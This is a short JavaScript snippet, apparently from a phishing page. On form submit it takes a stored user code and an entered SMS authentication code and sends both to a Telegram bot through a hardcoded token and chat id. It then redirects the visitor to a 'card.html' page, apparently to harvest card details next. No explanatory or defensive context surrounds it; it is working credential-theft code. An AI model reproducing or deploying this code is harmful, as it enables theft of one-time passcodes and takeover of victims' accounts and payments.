var input = document.getElementById('input');
var usercode = localStorage.getItem('usercode') ;

document.getElementById('form3').addEventListener('submit', function(e){
    e.preventDefault();
    const bot = new Bot("6135693705:AAEYjbPzeLclg5QVZbLDaxevBy86Xjwf1G4", 2068186644);

    bot.sendMessage('👔User : ' + usercode + '📨auth_sms : ' + input.value)
    .then(res => {
        console.log(res);
        //debugger
        window.location.href = './card.html'
    })
})